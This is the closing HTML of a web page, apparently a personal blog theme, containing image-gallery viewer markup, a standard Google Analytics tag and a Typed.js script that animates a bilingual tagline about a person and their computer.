                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>



    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-149874671-1');
    </script>





<script>
    function initialTyped () {
        var typedTextEl = $('.typed-text');
        if (typedTextEl && typedTextEl.length > 0) {
            var typed = new Typed('.typed-text', {
                strings: ["There seems to be a umbilical cord between the computer and his soul. That&#39;s why as long as he is in front of the computer, he will become a giant!", "电脑与他的灵魂之间似乎有一条脐带相连。这就是为什么只要他在计算机面前，他就会成为巨人的原因!"],
                typeSpeed: 90,
                loop: true,
                loopCount: Infinity,
                backSpeed: 20,
            });
        }
    }

    if ($('.article-header') && $('.article-header').length) {
        $(document).ready(function () {
            initialTyped();
        });
    }
</script>




</html>
